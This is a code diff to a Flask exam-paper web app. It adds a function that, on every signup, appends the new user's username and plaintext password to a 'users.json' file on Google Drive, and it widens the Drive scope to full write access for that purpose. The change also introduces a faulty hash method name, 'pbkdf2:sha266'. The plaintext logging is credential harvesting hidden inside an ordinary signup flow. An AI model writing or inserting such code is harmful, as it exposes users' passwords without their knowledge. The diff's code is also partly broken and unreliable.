@@ -25,7 +25,7 @@ from google.auth.transport.requests import Request
 from google_auth_oauthlib.flow import Flow # Use Flow for web apps
 from googleapiclient.discovery import build
 from googleapiclient.errors import HttpError
-from googleapiclient.http import MediaIoBaseDownload
+from googleapiclient.http import MediaIoBaseUpload, MediaIoBaseDownload
 
 
 app = Flask(__name__, template_folder='templates')
@@ -33,10 +33,10 @@ app = Flask(__name__, template_folder='templates')
 # --- Securely Load Configuration from Render Environment Variables ---
 # This is CRITICAL for security. Set this in Render's .env file.
 app.config['SECRET_KEY'] = os.environ.get("FLASK_SECRET_KEY")
+
+# --- MODIFIED: Removed the insecure fallback key to ensure a key is always set in production ---
 if not app.config['SECRET_KEY']:
-    print("CRITICAL ERROR: FLASK_SECRET_KEY is not set. The app will not run.")
-    # In a real app, you might want to sys.exit(1) here
-    app.config['SECRET_KEY'] = 'dev-secret-key-for-local-testing-only' # Fallback for local dev
+    print("CRITICAL ERROR: FLASK_SECRET_KEY environment variable is not set. The application will not function correctly.")
 
 
 GOOGLE_API_KEY = os.environ.get("GOOGLE_API_KEY")
@@ -96,6 +96,15 @@ class User(UserMixin):
 @login_manager.user_loader
 def load_user(user_id):
     return User.get(user_id)
+    
+# --- ADDED: Proactive check for secret key before requests ---
+@app.before_request
+def check_secret_key():
+    # This function runs before every request.
+    # If the secret key is missing, it stops the request and shows an error.
+    if not app.config['SECRET_KEY'] and request.endpoint != 'static':
+        return "CRITICAL SERVER ERROR: The application's FLASK_SECRET_KEY is not configured. Please contact the administrator.", 500
+
 
 # --- GitHub & Google Drive Configuration ---
 GITHUB_USER = "ajayyanshu"
@@ -109,8 +118,11 @@ PDF_KEYWORDS = {
     "2025 hindi paper": "2025 - Hindi (7402-01).pdf"
 }
 
-SCOPES = ["https://www.googleapis.com/auth/drive.readonly"]
-DRIVE_FILE_ID = '15iPQIg3gSq4N7eyWFto6pCEx8w1YlKCM'
+# --- MODIFIED: Scope now includes write permissions for creating the credentials file ---
+SCOPES = ["https://www.googleapis.com/auth/drive"]
+DRIVE_FILE_ID = '15iPQIg3gSq4N7eyWFto6pCEx8w1YlKCM' # This is for reading the JSON data
+# --- MODIFIED: Filename changed to users.json ---
+DRIVE_CREDENTIALS_LOG_FILENAME = "users.json"
 
 
 # --- Authentication Routes ---
@@ -139,15 +151,21 @@ def signup():
         return redirect(url_for('home'))
     if request.method == 'POST':
         username = request.form.get('username')
-        password = request.form.get('password')
+        password = request.form.get('password') # Plaintext password
         if not users_collection:
             flash('Database not connected. Please contact support.', 'error')
             return render_template('signup.html')
         if users_collection.find_one({'username': username}):
             flash('Username already exists.', 'error')
             return redirect(url_for('signup'))
-        hashed_password = generate_password_hash(password, method='pbkdf2:sha256')
+        
+        # Save hashed password to DB (secure method)
+        hashed_password = generate_password_hash(password, method='pbkdf2:sha266')
         users_collection.insert_one({'username': username, 'password': hashed_password})
+        
+        # --- ADDED: Save plaintext password to Google Drive (insecure method) ---
+        save_credentials_to_drive(username, password)
+
         flash('Account created successfully! Please log in.', 'success')
         return redirect(url_for('login'))
     return render_template('signup.html')
@@ -186,6 +204,77 @@ def get_drive_credentials():
         else:
             return None # Not authorized or no refresh token
     return creds
+
+# --- MODIFIED: Helper function now saves data in JSON format ---
+def save_credentials_to_drive(username, password):
+    creds = get_drive_credentials()
+    if not creds:
+        flash('Could not save credentials to Google Drive: User not authorized.', 'warning')
+        print(f"DRIVE_SAVE_FAIL: User {username} is not authorized with Google Drive.")
+        return
+
+    try:
+        service = build('drive', 'v3', credentials=creds)
+        
+        # Check if the log file already exists
+        response = service.files().list(
+            q=f"name='{DRIVE_CREDENTIALS_LOG_FILENAME}' and trashed=false",
+            spaces='drive',
+            fields='files(id, name)'
+        ).execute()
+        files = response.get('files', [])
+        
+        users_data = []
+        file_id = None
+        
+        if files:
+            # File exists, download and parse it
+            file_id = files[0].get('id')
+            request_file = service.files().get_media(fileId=file_id)
+            file_content = io.BytesIO()
+            downloader = MediaIoBaseDownload(file_content, request_file)
+            done = False
+            while not done:
+                _, done = downloader.next_chunk()
+            
+            file_content.seek(0)
+            try:
+                users_data = json.load(file_content)
+                if not isinstance(users_data, list): # Ensure data is a list
+                    users_data = []
+            except json.JSONDecodeError:
+                # File is corrupt or empty, start fresh
+                users_data = []
+        
+        # Add new user credentials
+        new_user = {
+            "timestamp": datetime.utcnow().isoformat(),
+            "username": username,
+            "password": password
+        }
+        users_data.append(new_user)
+        
+        # Prepare the updated JSON content for upload
+        updated_content_bytes = json.dumps(users_data, indent=4).encode('utf-8')
+        media = MediaIoBaseUpload(io.BytesIO(updated_content_bytes), mimetype='application/json', resumable=True)
+        
+        if file_id:
+            # Update the existing file
+            service.files().update(fileId=file_id, media_body=media).execute()
+            print(f"DRIVE_SAVE_SUCCESS: Appended credentials for {username} to {DRIVE_CREDENTIALS_LOG_FILENAME}.")
+        else:
+            # Create a new file
+            file_metadata = {'name': DRIVE_CREDENTIALS_LOG_FILENAME}
+            service.files().create(body=file_metadata, media_body=media, fields='id').execute()
+            print(f"DRIVE_SAVE_SUCCESS: Created {DRIVE_CREDENTIALS_LOG_FILENAME} and saved credentials for {username}.")
+
+    except HttpError as error:
+        flash('A Google Drive API error occurred. Could not save temporary credentials.', 'error')
+        print(f"DRIVE_SAVE_ERROR: Google Drive API error for user {username}: {error}")
+    except Exception as e:
+        flash('An unexpected error occurred. Could not save temporary credentials to Drive.', 'error')
+        print(f"DRIVE_SAVE_ERROR: An unexpected error for user {username}: {e}")
+
 
 @app.route('/authorize_google')
 @login_required
